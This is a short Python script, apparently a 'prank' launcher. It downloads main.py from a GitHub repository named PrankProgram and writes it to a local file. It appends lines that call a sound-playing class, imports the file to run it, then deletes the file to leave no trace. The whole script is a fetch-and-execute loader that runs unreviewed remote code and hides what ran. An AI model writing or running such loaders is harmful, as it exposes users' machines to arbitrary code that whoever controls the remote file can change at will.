import requests, os

file_text = requests.get("https://raw.githubusercontent.com/GummyC/PrankProgram/refs/heads/main/main.py").text


with open ("test.py", "w") as f:
    f.write(file_text)
    f.write("test = playSound()\n")
    f.write("test.Play()")

import test

os.remove("test.py")



